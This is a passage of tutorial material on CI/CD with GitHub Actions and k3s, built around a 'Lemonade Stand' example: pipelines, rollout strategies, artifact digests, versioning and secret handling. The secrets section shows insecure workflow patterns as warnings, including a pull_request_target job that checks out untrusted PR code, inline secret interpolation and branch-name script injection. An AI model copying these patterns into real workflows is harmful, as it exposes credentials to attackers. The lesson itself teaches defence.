Default choice; nothing to maintain
runs-on: ubuntu-latest


Larger hosted
Same, with more CPU or memory
Slow builds
a larger-runner label set up by your organisation


Self-hosted
A machine you run, registered with GitHub
Deploying into a private network, special hardware
runs-on: [self-hosted, linux]



For the Lemonade Stand, a self-hosted runner inside the shop’s network can reach the k3s API without exposing it to the internet. The trade-off: you must patch and clean that machine yourself, and you must never let untrusted pull requests run on it.

title: Pipeline Building Blocks
text:
Rules and conventions

Keep pipeline files in the repository, reviewed like any other code.
Name jobs and steps after what they check (test, build-image), not after tools (job1).
Make jobs independent and repeatable: same commit in, same result out.
Put cheap, fast checks first so failures appear in seconds.
Treat runners as disposable; never rely on leftovers from a previous run.
Pass build outputs forward; never rebuild the same thing later “to deploy it” (see Lesson 5).
Give each environment only the secrets it needs.

title: Pipeline Building Blocks
text:
Mathematical Abstraction
Write the jobs as a directed acyclic graph (DAG) \(G = (J, E)\):

\(J\) is the set of jobs;
\(E \subseteq J \times J\) is the set of arrows, with \((a, b) \in E\) when job \(b\) has needs: a;
“acyclic” means no job can (directly or indirectly) need itself.

Each job \(j\) takes \(t_j\) minutes. With enough runners, jobs without an arrow between them run in parallel, so the wall-clock time of the whole pipeline is the length of the longest path (the critical path):
\[
D = \max_{P \in \mathcal{P}(G)} \sum_{j \in P} t_j
\]
where

\(\mathcal{P}(G)\) is the set of all paths that start at a job with no needs and end at a job nothing needs;
\(P\) is one such path, a sequence of jobs;
\(\sum_{j \in P} t_j\) adds up the minutes of the jobs on that path;
\(\max\) picks the longest one;
\(D\) is the pipeline duration in minutes.

Example. The Lemonade pipeline with deploy added: check-syntax \(t = 1\), test \(t = 3\), image \(t = 4\) (needs both), staging \(t = 2\) (needs image). The two paths are:

\(P_1\) = check-syntax → image → staging: \(1 + 4 + 2 = 7\) minutes;
\(P_2\) = test → image → staging: \(3 + 4 + 2 = 9\) minutes.

So \(D = \max(7, 9) = 9\) minutes. Making check-syntax faster cannot help at all; only the jobs on \(P_2\) matter.
The runner time you pay for is different: every job is billed, parallel or not.
\[
B = \sum_{j \in J} t_j
\]
where \(B\) is the total runner minutes for one pipeline run and the sum adds every job’s minutes once.
Example. \(B = 1 + 3 + 4 + 2 = 10\) runner minutes, while the team waits only \(D = 9\) minutes. Running all four jobs one after another in a single job would take \(10\) minutes of waiting too, so parallel jobs save waiting time, not runner time. (Job durations here are illustrative; the real Lemonade tests take under a second, and most of a real job’s time is runner start-up and checkout.)

title: CI/CD Pipelines
text:
In Part 1, Ansible prepared the Lemonade Stand servers. In Part 2, k3s ran the app as the Deployment lemonade-web in the namespace lemonade. One question is still open: how does a new version get from a programmer’s laptop to the customers?
Doing it by hand means running the tests (if you remember), building a container image, pushing it, editing a manifest and running kubectl, at midnight, while hoping nothing was forgotten. A CI/CD pipeline is a robot that does those steps the same way every time a change is pushed.






TipExplain it like I’m ten



Think of a real lemonade stand. Before a new recipe reaches a customer, it passes a line of checkpoints: someone mixes it, someone tastes it, someone pours it into bottles with a label, a friend tries one bottle, and only then does the bottle go on the counter. If any checkpoint says “yuck”, the bottle never reaches the counter. A CI/CD pipeline is that line of checkpoints for software, and a robot runs it every time anyone changes the recipe.

title: CI/CD Pipelines
text:
Glossary







Word
Meaning in one line




Continuous integration (CI)
Everyone merges small changes into the main branch often, and a robot checks every merge


Continuous delivery
Every change that passes the pipeline could be released with one button press


Continuous deployment
Every change that passes the pipeline is released, with no button


Pipeline / workflow
The whole list of automated checkpoints, written in a file in the repository


Trigger / event
What starts the pipeline: a push, a pull request, a timer, a button


Job
A group of steps that run together on one machine


Step
One command or one reusable action inside a job


Runner
The machine that executes a job


Artifact
A file the pipeline produces and keeps, such as a test report or a built package


Container image
A packaged app plus everything it needs to run, stored in a registry


Digest
The fingerprint (sha256:...) of an image; it never changes


Environment
A named deployment target such as staging or production, with its own secrets and rules


Secret
A password or key the pipeline needs but must never print


Status check
The green tick or red cross a pipeline puts on a commit or pull request


Rollback
Going back to the previous working version

title: CI/CD Pipelines
text:
Prerequisites and connections

Part 1: Ansible installs and configures the k3s host that the pipeline deploys to.
Part 2: k3s explains the Deployment, Service and rolling update that the pipeline drives.
The System Design section explains idempotency and failure handling, which the deploy step relies on.

title: CI/CD Pipelines
text:
Mathematical Abstraction
A pipeline is a chain of gates. A change reaches production only if it passes all of them:
\[
\operatorname{ship}(c) \iff \bigwedge_{i=1}^{k} g_i(c)
\]
where

\(c\) is one change (one commit);
\(k\) is the number of gates in the pipeline (a whole number, \(k \ge 1\));
\(g_i(c)\) is true when gate number \(i\) accepts change \(c\), and false otherwise;
\(\bigwedge_{i=1}^{k}\) means “gate 1 and gate 2 and … and gate \(k\)”;
\(\iff\) means “exactly when”: both sides are true together or false together;
\(\operatorname{ship}(c)\) is true when \(c\) is allowed into production.

Example. The Lemonade pipeline has \(k = 4\) gates: \(g_1\) = tests pass, \(g_2\) = image builds, \(g_3\) = staging rollout succeeds, \(g_4\) = a reviewer approves. A commit that changes the mint price passes the tests (\(g_1 = \text{true}\)), builds (\(g_2 = \text{true}\)), rolls out to staging (\(g_3 = \text{true}\)), but the reviewer rejects it (\(g_4 = \text{false}\)). Then
\[
\operatorname{ship}(c) = \text{true} \land \text{true} \land \text{true} \land \text{false} = \text{false},
\]
so the new price never reaches customers. One “no” anywhere is enough to stop a change, which is why gates that are fast and cheap should come first (see Lesson 4).

Jez Humble and David Farley, Continuous Delivery (Addison-Wesley, 2010), and continuousdelivery.com.

title: Deployment Strategies
text:
The pipeline can now build a tested image. The last step, replacing the running version, is where customers notice mistakes. The Lemonade team’s first attempt was “stop everything, start the new version”:

For about a minute the stand showed errors to everyone (downtime).
When the new version had a pricing bug, every customer saw it at once.
Going back meant another full stop-and-start.

A deployment strategy answers two questions: how do we swap versions without closing the stand, and how few customers see a bad version before we notice?






TipExplain it like I’m ten



Rolling update. The stand has three cups on the table. You replace them one at a time: put down one new cup, take away one old cup, and repeat. Customers can always grab a cup.
Blue-green. You have two tables, a blue one and a green one. Customers use the blue table. You set up the new recipe on the green table, taste it, and then turn the big arrow sign to point at green. If something tastes wrong, you turn the sign back. Martin Fowler describes this in Blue Green Deployment (2010).
Canary. Long ago, coal miners carried a canary bird into the mine. If the air went bad, the canary felt it first, and the miners got out in time. A canary release gives the new version to a few customers first; if they have trouble, almost everyone is safe. See Canary Release on martinfowler.com (Danilo Sato, 2014).
Feature flag. An electrician can wire a new lamp today and leave it switched off. On Friday, you flick the switch. If the lamp flickers, you flick it off again; no electrician needed. Pete Hodgson’s Feature Toggles (aka Feature Flags) explains the kinds of switches teams use.
Dark launch. Before Facebook showed its Chat window to anyone in 2008, people’s browsers quietly sent pretend chat traffic to the new servers, so the engineers could watch the load with nobody seeing the feature. Then they “turned the lights on”. Eugene Letuchy tells the story in Facebook Chat.

title: Deployment Strategies
section: Worked examples on the Lemonade Stand
text:
Worked examples on the Lemonade Stand

1. Rolling update (what the pipeline does)
The lab’s k8s/deployment.yaml says “keep 3 pods, add at most 1 extra, never drop below 3 ready”:
spec:
  replicas: 3
  strategy:
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
  template:
    spec:
      containers:
        - name: web
          readinessProbe:
            httpGet: { path: /health, port: 8080 }
When the pipeline applies a new image, k3s starts one new pod (4 pods). Once it passes /health, k3s stops one old pod (3 pods), and repeats three times. kubectl rollout status waits for the end, and the deploy workflow rolls back if it fails:
kubectl -n lemonade rollout status deployment/lemonade-web --timeout=180s \
  || kubectl -n lemonade rollout undo deployment/lemonade-web
If the new image cannot start at all (a wrong tag, a crash on boot), its pod never becomes ready. Because maxUnavailable: 0, all three old pods keep serving the whole time, so customers never notice. The rollout times out and undo cleans up.


2. Canary with plain Kubernetes
A Service sends traffic to every ready pod whose labels match its selector. Add a second, one-pod Deployment with the same app: lemonade label and the new image:
apiVersion: apps/v1
kind: Deployment
metadata: { name: lemonade-web-canary, namespace: lemonade }
spec:
  replicas: 1
  selector: { matchLabels: { app: lemonade, track: canary } }
  template:
    metadata: { labels: { app: lemonade, track: canary } }
    spec:
      containers:
        - { name: web, image: "ghcr.io/acme/lemonade-stand@sha256:NEW" }
Scale the stable Deployment to 9 and about 1 request in 10 reaches the canary. (Give the stable Deployment a track: stable label in its selector too, as the Kubernetes docs’ canary example does, so the two Deployments’ selectors never overlap.) Watch its errors for 30 minutes. If they look healthy, roll the new image out to the stable Deployment and delete the canary; if not, delete the canary. Traffic is split per connection, not per user, so this is a rough canary; a service mesh or an ingress with traffic weights gives precise percentages.


3. Blue-green by switching the Service selector
Run lemonade-blue (old) and lemonade-green (new) Deployments side by side, labelled color: blue and color: green. The Service picks one:
kubectl -n lemonade patch service lemonade-web \
  -p '{"spec":{"selector":{"app":"lemonade","color":"green"}}}'   # switch to green
kubectl -n lemonade patch service lemonade-web \
  -p '{"spec":{"selector":{"app":"lemonade","color":"blue"}}}'    # instant rollback


4. A feature flag for mint lemonade
Deploy the code on Monday, release the drink on Friday, without a new deployment:
const flags = { mint: process.env.FLAG_MINT === 'on' };       // read once at start-up
const menu = flags.mint ? MENU : { classic: MENU.classic, pink: MENU.pink };
Turning the flag on is a configuration change (an environment variable in the Deployment, or a flag service), and turning it off is the fastest rollback there is. Delete the flag and the if once mint is permanent; old flags pile up into confusing code.

title: Deployment Strategies
text:
Choosing a strategy








If you need…
Choose
Because




Zero downtime, simple setup
Rolling update
Built into Kubernetes


Instant switch and instant rollback
Blue-green
Old version stays warm


To limit damage from unknown bugs
Canary
Few users see it first


To separate deploying from releasing
Feature flag
Release is a switch, not a deploy


To test load before anyone sees it
Dark launch
Real traffic, hidden result


Old and new can never run together (for example an incompatible database change)
Recreate, or expand-and-contract
Avoids mixed versions



A database change needs care with every strategy except Recreate, because old and new code run at the same time. Use expand and contract: first add the new column (both versions work), then deploy code that uses it, and only later remove the old column.

title: Deployment Strategies
text:
Rules and conventions

Always have a readiness probe; it is what makes rolling and canary updates safe.
Decide the rollback before deploying; rehearse it.
Deploy by digest so “the previous version” is unambiguous.
Keep both versions compatible with the database during a rollout (expand and contract).
Define canary success in numbers before you start: error rate, latency, time window.
Deploy small changes often; small changes make every strategy safer.
Remove feature flags when they are no longer needed.

title: Deployment Strategies
text:
Common mistakes








Mistake
Symptom
Fix




No readiness probe
Traffic hits pods that are still starting; errors during every deploy
Add readinessProbe on /health


maxUnavailable too high with few replicas
Capacity drops during a deploy
maxUnavailable: 0, maxSurge: 1

Bad canary “looks fine” because nobody watches
Write the threshold down; automate the check

Goes “back” to the broken image

Owner and removal date for every flag

title: Deployment Strategies
text:
Mathematical Abstraction

1. Capacity during a rolling update
Let \(R\) be the desired number of replicas, \(s\) the value of maxSurge and \(u\) the value of maxUnavailable. During the whole update, Kubernetes keeps
\[
R - u \ \le\ \text{ready pods} \quad\text{and}\quad \text{total pods} \ \le\ R + s
\]
where

\(R\) is replicas, a whole number;
\(s\) is maxSurge and \(u\) is maxUnavailable, both whole numbers here (percentages are first converted: surge rounds up, unavailable rounds down);
“ready pods” are pods passing their readiness probe, which receive traffic;
“total pods” counts old and new pods together.

Example. The Lemonade Stand: \(R = 3\), \(s = 1\), \(u = 0\). So at least \(3 - 0 = 3\) pods serve customers at every moment, and at most \(3 + 1 = 4\) pods exist. Each round replaces at most \(s + u = 1\) pod, so the update takes about
\[
\left\lceil \frac{R}{s + u} \right\rceil = \left\lceil \frac{3}{1} \right\rceil = 3 \text{ rounds,}
\]
where \(\lceil x \rceil\) rounds up to a whole number. With \(s = 1\), \(u = 1\) it would take \(\lceil 3/2 \rceil = 2\) rounds but could drop to \(3 - 1 = 2\) ready pods.


2. Blast radius of a canary
If the new version breaks a fraction \(q\) of requests, and it receives a fraction \(f\) of traffic for \(\Delta t\) hours before someone notices:
\[
A = N \cdot \Delta t \cdot f \cdot q
\]
where

\(N\) is the number of customer requests per hour;
\(\Delta t\) is the time until the problem is detected and traffic is pulled, in hours;
\(f\) is the share of traffic the new version gets (\(0 < f \le 1\); a full release is \(f = 1\));
\(q\) is the share of those requests the bug breaks (\(0 \le q \le 1\));
\(A\) is the expected number of broken customer requests.

Example. The stand gets \(N = 2000\) orders an hour; a pricing bug breaks every order, \(q = 1\); it is noticed after \(\Delta t = 0.5\) hours. With a canary of 1 pod out of 10, \(f = \frac{1}{10} = 0.1\):
\[
A = 2000 \times 0.5 \times 0.1 \times 1 = 100 \text{ broken orders,}
\]
compared with \(2000 \times 0.5 \times 1 \times 1 = 1000\) for a full release. The canary cut the damage by \(10\times\). Faster detection (smaller \(\Delta t\)) helps just as much as a smaller \(f\).


3. The cost of blue-green
During the switch both colours run in full, so the cluster needs
\[
C_{\text{blue-green}} = 2R \quad\text{versus}\quad C_{\text{rolling}} = R + s
\]
pods, where \(C\) is the peak number of pods. Example: with \(R = 3\) and \(s = 1\), blue-green needs \(2 \times 3 = 6\) pods at the peak, rolling needs \(3 + 1 = 4\). Blue-green buys an instant rollback with 2 extra pods.

title: Artifacts, Caching and Versioning
text:
The Lemonade team used to build the app twice: once in CI to run the tests, and again on the production server to deploy it. One Friday, the second build pulled a newer base image (node:latest) that had just changed. Production ran code that no test had ever seen. Rolling back did not help either: they had deployed the tag latest, and latest now pointed at the broken image, so there was nothing to roll back to.
They need three things: build the app once and ship that exact result; name each result so it can never be swapped; and save time on repeated work without risking correctness.






TipExplain it like I’m ten



Build once. Bake one cake. Give a slice to the taster. If the taster says “yum”, bring that same cake to the party. Don’t bake a second cake for the party and hope it tastes the same: you might grab the salt instead of the sugar. Jez Humble and David Farley make “only build your binaries once” a core rule in Continuous Delivery (2010).
Tags and digests. A tag is a name sticker on a lunchbox: “Ana’s lunch”. Anyone can peel it off and stick it on a different box. A digest is a fingerprint of what is inside the box. If even one crumb changes, the fingerprint changes. To be sure you get the exact lunch, ask for the fingerprint.
Version numbers. Think of a book: 2.4.1. The first number is a whole new book (old readers may be confused), the middle number means a new chapter was added (old chapters still work), and the last number means a typo was fixed. Tom Preston-Werner, a co-founder of GitHub, wrote these rules down as Semantic Versioning.
Cache. A pantry of lemons you already cut yesterday. It saves time, but if the pantry is empty you can always cut fresh lemons. A cache may make things faster; it must never be the only way to get them.

text:
The concepts, precisely









Keyword
What it does
Rule / convention
Example




Artifact
A file a job produces and stores after the job ends
Use for reports and build outputs that later jobs or people need
report.xml, a .tgz package

The app plus its runtime, packaged in layers
The Lemonade Stand’s real deliverable
ghcr.io/acme/lemonade-stand

A server that stores images

A movable, human-friendly name for an image

1.4.2 → 1.5.0

Sorts before the release
1.5.0-rc.1 < 1.5.0

title: Artifacts, Caching and Versioning
text:
A worked example

1. Build once, deploy the digest
The image job in ci.yml builds and pushes once, tags the image with the commit SHA, and exports the digest for every later job:
outputs:
  ref: ${{ steps.name.outputs.repo }}@${{ steps.build.outputs.digest }}
steps:
  - id: build
    uses: docker/build-push-action@v7
    with:
      context: .
      push: true
      tags: ${{ steps.name.outputs.repo }}:${{ github.sha }}
Both deploy jobs receive needs.image.outputs.ref, for example ghcr.io/acme/lemonade-stand@sha256:7aaa..., so staging and production run byte-for-byte the same image. The tag :<sha> is for humans looking at the registry; the digest is what the cluster runs.


2. A digest is a fingerprint of content
A digest is just SHA-256 of the content. Change one character and the fingerprint is completely different. Real output:
$ printf 'classic=250\n' | shasum -a 256
532c490f5f16bdda3be1655d2d2e8f43c354cc65355a90ae12b81db66af8087e  -
$ printf 'classic=260\n' | shasum -a 256
7aaa5fdf500b78d72f2ff40f4b9723f4d3dbb42534d13a3e60a5192511ff97a6  -
An image digest works the same way, over the image manifest (which itself lists the digests of every layer). That is why @sha256:... can never quietly start meaning something else.


3. Pinning the base image
The Lemonade Dockerfile starts with an exact version, not node:latest:
FROM node:26.13.1-alpine3.24
A tag such as 26.13.1-alpine3.24 is far more stable than latest. For full safety you can pin the digest too (FROM node:26.13.1-alpine3.24@sha256:...) and let a bot such as Dependabot or Renovate open pull requests when a newer one appears.


4. Passing a test report between jobs
test:
  steps:
    - run: node --test --test-reporter=junit --test-reporter-destination=report.xml
    - uses: actions/upload-artifact@v7
      if: ${{ !cancelled() }}
      with: { name: test-report, path: report.xml }
publish-report:
  needs: test
  steps:
    - uses: actions/download-artifact@v8
      with: { name: test-report }
if: ${{ !cancelled() }} uploads the report even when tests fail, which is exactly when you need it.


5. Versions sort as numbers, not as text
Real output from Node, sorting the same four versions two ways:
string sort: 1.10.0  1.10.0-rc.1  1.9.3  2.0.0
semver sort: 1.9.3  1.10.0-rc.1  1.10.0  2.0.0
As text, "1.10.0" comes before "1.9.3" because the character 1 is smaller than 9. As versions, minor version 10 is newer than 9, and the release candidate comes before its release. A release workflow usually starts from a version tag:
on:
  push:
    tags: ['v*.*.*']      # git tag v1.5.0 && git push --tags


6. A cache for a project with dependencies
The Lemonade Stand has no npm dependencies, so it needs no cache. When it grows, this is the standard pattern:
- uses: actions/cache@v6
  with:
    path: ~/.npm
    key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
    restore-keys: npm-${{ runner.os }}-
- run: npm ci
npm ci still runs; the cache only means it downloads less. (actions/setup-node can also do this for you with cache: npm.)

title: Artifacts, Caching and Versioning
text:
Rules and conventions

Build once per commit; promote the same artifact through every environment.
Tag images with the commit SHA; deploy by digest.
Never deploy latest, and never overwrite a release tag.
Pin base images to an exact version; update them on purpose, through a pull request.
Use semantic versions for things other people depend on (libraries, APIs, Helm charts).
Cache downloaded tools and dependencies, not your own build outputs.
Key caches on the files that determine their content (hashFiles of the lock file).
Set retention-days so artifacts do not pile up forever.

title: Artifacts, Caching and Versioning
text:
Mathematical Abstraction

1. Tags move, digests do not
Let \(\mathcal{T}\) be the set of tags, \(\mathcal{D}\) the set of digests, and \(t\) a moment in time. A registry holds a mapping that can change over time, while the digest is a fixed function of content:
\[
\tau_t : \mathcal{T} \to \mathcal{D}, \qquad d = H(\text{content})
\]
where

\(\tau_t\) (“tau at time \(t\)”) says which digest a tag points to at time \(t\); a push can change it;
\(H\) is SHA-256, a deterministic function: the same content always gives the same digest;
\(d \in \mathcal{D}\) is the digest of one exact image.

Example. On Monday \(\tau_{\text{Mon}}(\texttt{latest}) = \texttt{sha256:532c...}\). On Friday someone pushes a new build and \(\tau_{\text{Fri}}(\texttt{latest}) = \texttt{sha256:7aaa...}\). The tag is the same, the image is different. But \(\texttt{sha256:532c...}\) still names Monday’s image, on Friday and forever. Deploying \(d\) instead of a tag makes the deployment reproducible.


2. Semantic version order and the next version
Write a version as a triple \(v = (M, m, p)\) of whole numbers. Versions compare lexicographically (like words in a dictionary, but field by field as numbers):
\[
(M_1, m_1, p_1) < (M_2, m_2, p_2) \iff
M_1 < M_2 \ \lor\ (M_1 = M_2 \land m_1 < m_2) \ \lor\ (M_1 = M_2 \land m_1 = m_2 \land p_1 < p_2)
\]
where

\(M\), \(m\), \(p\) are the MAJOR, MINOR and PATCH numbers;
\(\lor\) means “or” and \(\land\) means “and”.

Example. Compare \(1.9.3\) and \(1.10.0\): \(M_1 = M_2 = 1\), then \(m_1 = 9 < m_2 = 10\), so \(1.9.3 < 1.10.0\). (A pre-release such as \(1.10.0\text{-rc.1}\) sorts just before \(1.10.0\); that extra rule is in the SemVer specification.)
The next version depends on the kind of change:
\[
\operatorname{next}(M, m, p) =
\begin{cases}
(M + 1,\ 0,\ 0) & \text{if the change breaks existing users} \\
(M,\ m + 1,\ 0) & \text{if it adds a backwards-compatible feature} \\
(M,\ m,\ p + 1) & \text{if it only fixes a bug}
\end{cases}
\]
where \(\operatorname{next}\) gives the version to release after the current one \((M, m, p)\).
Example. The Lemonade API is at \(1.4.2\). Adding mint lemonade to / is a new feature: \(\operatorname{next}(1, 4, 2) = (1, 4 + 1, 0) = 1.5.0\). Later, renaming the field totalCents to total would break callers: \(\operatorname{next}(1, 5, 0) = (1 + 1, 0, 0) = 2.0.0\).


3. What a cache is worth
With hit rate \(h\), the expected time of the dependency step is:
\[
E[t] = h \cdot t_{\text{hit}} + (1 - h) \cdot t_{\text{miss}}
\]
where

\(h\) is the fraction of runs whose cache key is found (\(0 \le h \le 1\));
\(t_{\text{hit}}\) is the time when the cache is restored, in seconds;
\(t_{\text{miss}}\) is the time when it is not (full download, plus saving the new cache);
\(E[t]\) is the expected time per run.

Example (for a future Lemonade Stand with dependencies): a full npm ci takes 90 s, saving the cache adds 5 s, so \(t_{\text{miss}} = 95\); restoring takes \(t_{\text{hit}} = 8\) s; the lock file rarely changes, so \(h = 0.85\).
\[
E[t] = 0.85 \times 8 + 0.15 \times 95 = 6.8 + 14.25 = 21.05 \text{ s}
\]
That saves \(90 - 21.05 = 68.95\) s per run. At 40 runs a day, that is \(40 \times 68.95 = 2758\) s, about 46 minutes of waiting saved per day.

text:
References

Jez Humble and David Farley, Continuous Delivery (2010), chapter 5: “Only Build Your Binaries Once”.
Tom Preston-Werner, Semantic Versioning 2.0.0.
GitHub Docs, Workflow artifacts and Dependency caching reference.

title: Secrets, Environments and Approvals
text:
To deploy, the pipeline needs a key to the k3s cluster: a kubeconfig file. Whoever holds that file can delete every pod in the Lemonade Stand. The team has to answer:

Where does the key live, so it is never committed to git and never printed in a log?
Which jobs may use it? The test job on a stranger’s pull request certainly should not.
Who decides that a change goes to production, and how is that decision recorded?
What if the key leaks anyway: how much damage, for how long?







TipExplain it like I’m ten



Secrets. The key to the lemonade money box lives in a locked drawer, not taped to the stand. The robot gets the key only while it is doing the job that needs it, and if it ever starts reading the key out loud, the drawer covers its mouth (GitHub replaces the secret with *** in logs).
Least privilege. When a babysitter comes over, you give them the front-door key, not the key to the safe. Jerome Saltzer and Michael Schroeder wrote this down in 1975 in The Protection of Information in Computer Systems: every program and every person should have only the rights it needs to do its job. A test job does not need the right to publish images.
Approvals. Before a school trip, a parent must sign a permission slip. The bus does not leave until it is signed. A GitHub environment with required reviewers is that slip: the production deploy waits until a named person approves.
Short-lived tokens. At a fair you get a wristband that only works today. If you lose it, nobody can use it tomorrow. A copied house key works for years. OIDC tokens are wristbands; long-lived passwords are house keys.
Strangers’ pull requests. Anyone on the internet can send a pull request to a public repository. Running their code with your secrets is like letting a stranger’s homework be marked by a robot that holds your house keys: the homework can say “give me the keys”. GitHub Security Lab’s article Preventing pwn requests shows real cases of exactly this.

title: Secrets, Environments and Approvals
text:
The concepts, precisely









Keyword
What it does
Rule / convention
Example




Secret
An encrypted value given to jobs as secrets.NAME
Letters, digits, _; not starting with GITHUB_ or a digit; up to 48 KB
secrets.KUBECONFIG_B64


Repository secret
Visible to every workflow in the repo
For things every job may use
a registry token

Visible only to jobs that use that environment, after its rules pass
For deploy credentials
KUBECONFIG_B64 in production


Organisation secret
Shared across chosen repositories
For shared tooling
a Slack webhook


Variable

vars.LEMONADE_URL

Hides a secret’s value in logs as ***

secrets.GITHUB_TOKEN

Scopes you leave out become none; widen per job
packages: write


Environment
A named target with protection rules, secrets and variables
One per target; name matches environment:
production

Up to 6; one approval is enough
the shop owner

Turn on for production

0 to 43,200 minutes

Which refs may deploy to the environment
Only main for production
main

No stored cloud keys at all
AWS, Azure, GCP, Vault


pull_request

Safe default for untrusted code
test a contributor’s PR

labelling PRs only

title: Secrets, Environments and Approvals
section: A worked example: protecting the Lemonade production deploy
text:
A worked example: protecting the Lemonade production deploy

1. Store the cluster key as an environment secret
Encode the kubeconfig (it contains line breaks) and store it in each environment with the GitHub CLI:
base64 < staging-k3s.yaml | gh secret set KUBECONFIG_B64 --env staging
base64 < prod-k3s.yaml    | gh secret set KUBECONFIG_B64 --env production
gh variable set LEMONADE_URL --env production --body https://lemonade.example.com
The same secret name holds a different value in each environment, so deploy.yml stays identical for both.


2. Add the permission slip
In Settings → Environments → production: add yourself under Required reviewers, tick Prevent self-review, and under Deployment branches and tags allow only main.


3. Use the environment in the job
The core of deploy.yml:
permissions:
  contents: read                         # the token can only read code
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}   # rules run first, then secrets unlock
    steps:
      - name: Write kubeconfig
        env:
          KUBECONFIG_B64: ${{ secrets.KUBECONFIG_B64 }}   # secret enters via env
        run: |
          printf '%s' "$KUBECONFIG_B64" | base64 -d > "$RUNNER_TEMP/kubeconfig"
          echo "KUBECONFIG=$RUNNER_TEMP/kubeconfig" >> "$GITHUB_ENV"
Three safety details:

The secret goes through env: and is used as "$KUBECONFIG_B64", never pasted into the script with ${{ }}.
The file goes to $RUNNER_TEMP, which is wiped after the job, not into the checked-out repo.
When the production job reaches environment: production, the run pauses with “Waiting for review” until a reviewer approves. Only then does the job start and receive KUBECONFIG_B64.



4. Least-privilege token, per job
The image job is the only one that needs to write packages, so only it asks:
permissions:
  contents: read          # top level: everyone reads
jobs:
  image:
    permissions:
      contents: read
      packages: write     # only this job may push to ghcr.io


5. OIDC instead of stored cloud keys
If the Lemonade Stand moved to a cloud-managed cluster, the job would not store a key at all. It would ask GitHub for a token and exchange it:
permissions:
  id-token: write       # allow this job to request an OIDC token
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@v6
    with:
      role-to-assume: arn:aws:iam::123456789012:role/lemonade-deployer
      aws-region: eu-west-2
The cloud trusts tokens whose subject is, for example, repo:acme/lemonade-stand:environment:production, so only production deploys of this repository can assume that role. The k3s lab keeps the simpler kubeconfig secret; the idea of “no long-lived key” is the same.


6. Pull requests from forks
on: pull_request            # fork PRs: read-only token, no secrets: safe for tests
on: pull_request_target     # DANGER: secrets and write token are available
steps:
  - uses: actions/checkout@v7
    with:
      ref: ${{ github.event.pull_request.head.sha }}   # runs the stranger's code. Never do this.
Test untrusted code with pull_request. Keep pull_request_target for jobs that never execute PR code, such as adding a label.

title: Secrets, Environments and Approvals
text:
Rules and conventions

Never commit secrets; never put them in vars, env: at the top level, or job outputs.
Put deploy credentials in environment secrets, not repository secrets.
Pass secrets to scripts through env: and quote them: "$NAME".
Start every workflow with permissions: contents: read; widen per job.
Protect production with required reviewers, prevent self-review, and limit it to main.
Prefer OIDC and short-lived credentials over stored keys; rotate any stored key.
Use pull_request for untrusted code. Treat pull_request_target, workflow_run and issue_comment as privileged.
Treat every github.event.* text field (titles, branch names, comments) as attacker input.

title: Secrets, Environments and Approvals
text:
Common mistakes








Mistake
Symptom
Fix




run: deploy --token ${{ secrets.TOKEN }}
Secret is pasted into the script text; can leak in error messages
env: { TOKEN: ... } and "$TOKEN"


Printing a derived value (for example a base64-decoded secret)
The decoded value appears in the log unmasked

A test job on any branch can read them
Move them to the production environment


Workflow-wide permissions: write-all
A compromised step can push code or packages
contents: read; add scopes per job


pull_request_target plus checkout of the PR head
A stranger’s code runs with your secrets (“pwn request”)
Use pull_request for untrusted code


Branch names in scripts via ${{ github.head_ref }}
Script injection via a crafted branch name
Pass through env:


One reviewer approves their own deploy
No real second pair of eyes
Turn on Prevent self-review

title: Secrets, Environments and Approvals
text:
Mathematical Abstraction

1. Least privilege as sets
Let \(\mathcal{P}\) be the set of all token permissions, \(R \subseteq \mathcal{P}\) the permissions a job really needs, and \(G \subseteq \mathcal{P}\) the permissions it is granted. The job works when \(R \subseteq G\), and its unnecessary risk is the excess:
\[
\operatorname{excess} = G \setminus R, \qquad \text{least privilege} \iff G = R
\]
where

\(\subseteq\) means “is contained in”;
\(G \setminus R\) (“\(G\) minus \(R\)”) is the set of permissions granted but not needed;
least privilege means the excess is empty, \(G \setminus R = \varnothing\).

Example. The image job needs \(R = \lbrace \texttt{contents:read}, \texttt{packages:write} \rbrace\). With an old “write everything” default it would get \(G = \lbrace \texttt{contents:write}, \texttt{packages:write}, \texttt{issues:write}, \texttt{pull-requests:write} \rbrace\) (four of the scopes, for brevity). Then
\[
G \setminus R = \lbrace \texttt{contents:write}, \texttt{issues:write}, \texttt{pull-requests:write} \rbrace,
\]
3 permissions an attacker could abuse. (Note that \(\texttt{contents:write}\) covers reading, so \(R \subseteq G\) still holds.) With the job’s explicit permissions block, \(G = R\) and the excess is \(\varnothing\). (Repositories and organisations created since February 2023 default to a read-only token, but older ones may still default to read and write, so write the block explicitly.)


2. When does a protected deploy start?
A job that targets an environment with a wait timer and required reviewers starts at
\[
t_{\text{start}} = \max\left(t_0 + w,\ t_{\text{approve}}\right)
\]
where

\(t_0\) is when the job became ready (all its needs finished), in minutes;
\(w\) is the wait timer in minutes;
\(t_{\text{approve}}\) is when the reviewer approved;
\(\max(a, b)\) is the later of the two times: both conditions must hold.

Example. Staging finishes at \(t_0 = 0\). Production has \(w = 15\) minutes. The shop owner approves at \(t_{\text{approve}} = 5\). Then \(t_{\text{start}} = \max(0 + 15, 5) = 15\): the approval came early, so the timer decides. If the owner approves at minute 40 instead, \(t_{\text{start}} = \max(15, 40) = 40\).


3. How long a leaked credential is useful
If a credential leaks at a random moment during its lifetime \(L\), it stays usable for the rest of that lifetime, on average half of it:
\[
E[\text{exposure}] = \frac{L}{2}
\]
where

\(L\) is the credential’s lifetime (time until it expires or is rotated), in hours;
\(E[\text{exposure}]\) is the expected time an attacker can use a leaked copy, in hours, assuming the leak time is uniformly random and nobody notices.

Example. A stored cloud key rotated every 90 days has \(L = 90 \times 24 = 2160\) hours, so \(E[\text{exposure}] = 1080\) hours (45 days). An OIDC-issued cloud credential that lasts 1 hour has \(L = 1\), so \(E[\text{exposure}] = 0.5\) hours. That is \(\frac{1080}{0.5} = 2160\) times shorter. Detection and revocation shorten both, but short lifetimes help even when nobody notices.

title: 5. Cloud Storage
text: Cloud Storage keeps files (called objects) in buckets. There are no disks to size and no servers to run: you put a file in, you get a URL out. It is the simplest way to put the Lemonade menu online.

title: 5. Cloud Storage
text:
The problem
The Lemonade Stand has three kinds of files:

index.html, the menu: public, read by every customer, changed weekly.
Drink photos, shown on the menu for a month, then rarely looked at.
Daily sales reports: private. Only the accountant may download them, through a link that stops working the same day.

The owner wants all three stored safely and cheaply, with no server to look after.

title: 5. Cloud Storage
